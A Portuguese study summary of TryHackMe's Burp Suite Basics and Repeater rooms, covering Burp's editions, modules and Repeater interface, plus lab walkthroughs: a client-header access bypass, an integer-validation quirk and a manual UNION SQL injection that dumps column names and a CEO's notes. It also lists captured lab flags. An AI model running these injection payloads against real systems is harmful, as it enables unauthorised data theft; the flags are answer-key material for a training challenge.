# 🛡️ Resumão Burp Suite — Basics + Repeater (Anotações TryHackMe)

> Módulo Burp Suite do TryHackMe. Cobre as duas primeiras salas: **The Basics** (teórica — framework, edições, interface, Proxy) e **Repeater** (prática — editar e reenviar requisições, culminando em SQL Injection manual).
>
> ⚠️ **Use apenas em laboratórios (TryHackMe, HackTheBox, PortSwigger Academy, VMs próprias) ou em sistemas para os quais você tenha autorização por escrito.**

---

## 📑 Índice

### Parte 1 — Burp Suite: The Basics
1. [O que é o Burp Suite](#1-o-que-é-o-burp-suite)
2. [As edições do Burp Suite](#2-as-edições-do-burp-suite)
3. [Ferramentas da Community](#3-ferramentas-da-community)
4. [Tela inicial de projetos](#4-tela-inicial-de-projetos)

### Parte 2 — Burp Suite: Repeater
5. [O que é o Repeater](#5-o-que-é-o-repeater)
6. [Interface do Repeater (6 áreas)](#6-interface-do-repeater-6-áreas)
7. [Uso básico: Proxy → Repeater](#7-uso-básico-proxy--repeater)
8. [Barra de visualização da resposta](#8-barra-de-visualização-da-resposta)
9. [Inspector](#9-inspector)
10. [Exemplo prático: header FlagAuthorised](#10-exemplo-prático-header-flagauthorised)
11. [Desafio: validação de endpoint](#11-desafio-validação-de-endpoint)
12. [Extra-mile: Union SQL Injection](#12-extra-mile-union-sql-injection)

### Apoio
13. [Atalhos essenciais](#13-atalhos-essenciais)
14. [Erros comuns](#14-erros-comuns)
15. [Flags capturadas](#15-flags-capturadas)

---

# Parte 1 — Burp Suite: The Basics

## 1. O que é o Burp Suite

Framework em **Java** para **pentest de aplicações web** (também mobile e APIs). É o padrão da indústria para testes manuais.

```text
 Navegador  ⇄  [ BURP (proxy) ]  ⇄  Servidor web
                     │
                     ├─ intercepta tráfego HTTP/HTTPS
                     ├─ permite ver e MODIFICAR requisições antes de chegarem ao servidor
                     ├─ permite modificar RESPOSTAS antes de chegarem ao navegador
                     └─ envia requisições para outros módulos (Repeater, Intruder...)
```

> O Burp é, antes de tudo, um **proxy que intercepta tráfego**. Todo o resto gira em torno disso.

---

## 2. As edições do Burp Suite

| Edição | Licença | Para que serve |
|---|---|---|
| **Community** | Gratuita (uso não comercial) | Testes manuais. **É a da trilha.** |
| **Professional** | Paga | Versão completa para profissionais |
| **Enterprise** | Paga | Varredura contínua e automática em servidor |

**O que a Professional tem a mais:** scanner automático, Intruder sem rate limit, projetos em disco + relatórios, API, extensões sem restrição e o **Collaborator** (captura requisições externas — útil para vulnerabilidades cegas como blind SSRF/XSS).

**Enterprise:** roda em servidor e faz scans periódicos automáticos. É para apps web o que o **Nessus** é para infraestrutura.

---

## 3. Ferramentas da Community

| Módulo | Para que serve |
|---|---|
| **Proxy** | Intercepta e modifica requisições/respostas |
| **Repeater** | Captura, modifica e reenvia a mesma requisição manualmente |
| **Intruder** | Dispara muitas requisições automaticamente (lento na Community) — brute-force, fuzzing |
| **Decoder** | Codifica e decodifica dados (Base64, URL, hex...) |
| **Comparer** | Compara dois dados por palavra ou byte |
| **Sequencer** | Analisa a aleatoriedade de tokens (ex.: cookies de sessão) |

**Extensões:** em Java, Python (Jython) ou Ruby (JRuby). Carregadas pela aba **Extensions** (antigo Extender); loja = **BApp Store**. Ex.: **Logger++**.

---

## 4. Tela inicial de projetos

| Opção | Na Community? |
|---|---|
| **Temporary project in memory** | ✅ (tudo some ao fechar) |
| New project on disk | ❌ (só Professional) |
| Open existing project | ❌ (só Professional) |

Fluxo: `Temporary project in memory → Next → Use Burp defaults → Start Burp`.

---

# Parte 2 — Burp Suite: Repeater

## 5. O que é o Repeater

Pega uma requisição (normalmente do Proxy), **modifica e reenvia quantas vezes quiser**. É a principal ferramenta de teste manual de endpoints — o ciclo **modifica → envia → observa** sem recarregar o navegador.

---

## 6. Interface do Repeater (6 áreas)

| Nº | Área | Função |
|---|---|---|
| 1 | **Request List** | Abas com as requisições enviadas ao Repeater |
| 2 | **Request Controls** | Send, Cancel e as setas `<` `>` (histórico de modificações) |
| 3 | **Request / Response** | Edita a requisição à esquerda, vê a resposta à direita |
| 4 | **Layout** | Lado a lado / vertical / abas separadas |
| 5 | **Inspector** | Vê e edita parâmetros, cookies e headers em tabela |
| 6 | **Target** | IP/domínio de destino (preenchido automaticamente) |

---

## 7. Uso básico: Proxy → Repeater

```text
1) Captura no Proxy (Intercept on)
2) Ctrl+R ou botão direito → Send to Repeater
3) No Repeater: Send → resposta aparece
4) Edita a requisição → Send de novo
5) Setas < > para navegar pelo histórico
```

💡 Após mandar ao Repeater, dê **Forward** ou desligue o Intercept, senão o navegador fica travado.

---

## 8. Barra de visualização da resposta

| Opção | Mostra | Quando usar |
|---|---|---|
| **Pretty** | Formatada (padrão) | A maior parte do tempo |
| **Raw** | Como veio do servidor | Sem tratamento |
| **Hex** | Byte a byte | Binários |
| **Render** | Como o navegador exibiria | Conferir visualmente |

Botão **`\n`**: mostra caracteres invisíveis (`\r\n` no fim de cada linha). Importam para interpretar headers e para ataques de CRLF.

---

## 9. Inspector

Mesma info do Raw, mas em tabela. Funciona no Proxy e no Repeater.

| Seção | Editável? |
|---|---|
| Request attributes (método, path, protocolo) | ✅ |
| Request query parameters (dados na URL) | ✅ |
| Request body parameters (POST) | ✅ |
| Request cookies | ✅ |
| Request headers | ✅ |
| **Response headers** | ❌ (quem define é o servidor; só aparece após o Send) |

---

## 10. Exemplo prático: header FlagAuthorised

Adicionar um header custom e ver o servidor reagir.

```text
1) Captura http://ALVO/ → Ctrl+R
2) Inspector → Request headers → + → FlagAuthorised : True
   (ou manualmente, antes da linha em branco final)
3) Send
```

O servidor passou a responder `text/plain` com a flag. **Lição:** controle de acesso baseado em header enviado pelo cliente é burlável — o cliente controla todo header (`X-Admin`, `X-Forwarded-For`, etc.).

> ⚠️ Grafia exata: `FlagAuthorised` (britânica, com **s**). `Authorized` não funciona.

---

## 11. Desafio: validação de endpoint

Endpoint `/products/N`. Enumerando IDs: **200** = existe, **404** = não existe.

- `/products/1'` (aspa encodada `%27`) → **404**: o endpoint valida o tipo e rejeita não-inteiros.
- `/products/-1` → **500**: `-1` **passa** no filtro "é inteiro?" mas não existe, quebrando a query. A flag saiu no 500.

> **Lição:** a validação checava "é um número?" mas não "é um número que faz sentido aqui?". Inteiro negativo passa no filtro de tipo e causa estado inesperado.

---

## 12. Extra-mile: Union SQL Injection

Alvo: `/about/ID`, que **não valida o tipo** (diferente do `/products/`). Objetivo: extrair as notas do CEO.

### Passo a passo

**1. Confirmar a falha**
```
/about/2'
```
→ **500**. A mensagem de erro é verbosa demais e revela a query:
```sql
SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'
```
Já entrega: tabela = **people**, e a query tem **5 colunas**.

**2. Descobrir os nomes das colunas**
```
/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null
         FROM information_schema.columns WHERE table_name="people"
```
- **ID = 0:** nenhum registro legítimo, então a 1ª linha é a injeção.
- **5 posições:** 1 alvo + 4 `null` (evita erro de contagem).
- **group_concat():** a página mostra 1 resultado por vez; junta todas as colunas numa string.

Resultado: `id, firstName, lastName, pfpLink, role, shortRole, bio, notes` → alvo = **notes**.

**3. Extrair a flag** (CEO = Jameson Wolfe, id **1**)
```
/about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
```

### Por que o UNION funciona
- Precisa do **mesmo número de colunas** da query original (por isso 5).
- `null` nas posições que não interessam (tipo compatível com qualquer coluna).
- ID inválido (0) descarta a linha real para a injeção aparecer primeiro.

---

## 13. Atalhos essenciais

| Atalho | Ação |
|---|---|
| **Ctrl+R** | Enviar requisição para o **Repeater** |
| **Ctrl+I** | Enviar requisição para o **Intruder** |
| **Ctrl+U** | **URL-encode** da seleção (espaço→`%20`, `'`→`%27`, `"`→`%22`) |
| **Ctrl+Shift+U** | URL-decode da seleção |
| **Send** | Enviar a requisição no Repeater |
| `<` `>` | Navegar pelo histórico de modificações |

---

## 14. Erros comuns

- ❌ Esquecer de dar **Forward** / desligar o Intercept → navegador travado.
- ❌ Não **URL-encodar** o payload no path → vem 404 em vez de executar a injeção.
- ❌ Adicionar header **depois** da linha em branco final → vira corpo, servidor ignora.
- ❌ Confundir **Professional** (manual, local) com **Enterprise** (scan contínuo em servidor).
- ❌ Esperar que o projeto fique salvo na Community (é só em memória).
- ❌ No UNION, errar o número de colunas → query quebra (confira as vírgulas).
- ❌ Testar sites sem autorização.

---

## 15. Flags capturadas

| Task | Flag |
|---|---|
| Repeater — Practical Example | `THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}` |
| Repeater — Challenge | `THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}` |
| Repeater — Extra-mile | *(notas do CEO via UNION SQLi em `/about/`)* |

---

*Próxima sala do módulo: **Burp Suite: Intruder** — automatiza o que foi feito aqui à mão.*
